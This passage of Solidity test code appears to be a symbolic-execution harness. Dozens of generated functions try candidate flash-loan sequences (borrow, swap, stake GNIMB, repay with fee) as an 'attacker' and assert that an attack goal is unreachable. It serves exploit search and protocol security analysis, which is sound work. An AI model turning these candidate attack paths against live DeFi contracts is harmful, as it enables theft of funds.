        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1346(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1347(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1348(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1349(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1350(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1351(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1352(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1353(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1354(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1355(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1356(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1357(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1358(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1359(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1360(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1361(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1362(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1363(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1364(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1365(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1366(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1367(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1368(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1369(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1370(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1371(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1372(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1373(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1374(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1375(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1376(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1377(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1378(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1379(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1380(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1381(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1382(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1383(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1384(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1385(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1386(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1387(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1388(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1389(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1390(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1391(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1392(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1393(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1394(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1395(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1396(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1397(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
